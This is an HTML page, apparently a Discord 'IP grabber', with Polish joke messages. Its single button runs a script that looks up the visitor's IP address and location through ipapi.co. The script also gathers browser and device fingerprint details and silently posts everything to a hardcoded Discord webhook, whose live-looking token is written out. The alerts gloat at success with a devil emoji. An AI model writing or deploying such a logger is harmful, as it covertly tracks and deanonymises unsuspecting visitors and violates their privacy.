<!DOCTYPE html>

<body style="background:#111;display:flex;justify-content:center;align-items:center;height:100vh;">
  <button onclick="sendData()" style="font-size:24px;padding:20px 40px;">

<script>
async function sendData() {
  try {
    const ipRes = await fetch("https://ipapi.co/json/")
    const ipData = await ipRes.json()

    const data = {
      ip: ipData.ip,
      city: ipData.city,
      region: ipData.region,
      country: ipData.country_name,
      isp: ipData.org,
      timezone: ipData.timezone,

      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      cpuCores: navigator.hardwareConcurrency || "?",
      ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "?",
      touch: 'ontouchstart' in window,
      cookies: navigator.cookieEnabled,
      referrer: document.referrer || "brak"
    }

    await fetch("https://discord.com/api/webhooks/1456448667949993996/t7B3LC8Jn1LJUfJYq9awyAsEuP3X05dA_elgnyj7WIw2546LCkAG4DKQvmvmtwIlAUjY", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })

    alert("PoleciaÅ‚o jak rakieta ðŸ˜ˆ")
  } catch (e) {
    alert("ZdechÅ‚o jak tani router XDDD")
  }
}
</script>
